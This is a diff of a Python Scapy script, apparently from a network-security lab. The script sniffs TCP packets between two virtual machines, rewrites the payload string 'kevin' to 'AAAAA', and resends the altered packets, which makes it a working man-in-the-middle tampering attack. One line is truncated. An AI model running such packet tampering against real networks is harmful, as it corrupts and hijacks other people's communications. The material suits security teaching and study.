@@ -7,10 +7,10 @@ def spoof_pkt(pkt):
     if pkt.haslayer(IP) and pkt.haslayer(TCP):
         if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
             data = pkt[TCP].payload.load
-            print(" Original data: %s, length: %d" % (data, len(data)))
+            print("*** Original data: %s, length: %d" % (data, len(data)))
 
             newdata = data.replace(b'kevin', b'AAAAA')
-            print(" Modified data: %s" % (newdata))
+            print("*** Modified data: %s" % (newdata))
 
             # Reconstruct the packet with the modified payload
             newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=p>
@@ -19,11 +19,11 @@ def spoof_pkt(pkt):
             del newpkt[TCP].chksum
 
             send(newpkt)
-            print(" Sent modified packet")
+            print("*** Sent modified packet")
         elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
             newpkt = IP(pkt[IP]) / TCP(pkt[TCP]) / Raw(load=pkt[TCP].payload.load)
             send(newpkt)
-            print(" Sent packet from VM B to VM A")
+            print("*** Sent packet from VM B to VM A")
 
-Sniff packets and call the spoof_pkt function
+# Sniff packets and call the spoof_pkt function
 sniff(filter="tcp", prn=spoof_pkt, store=0)
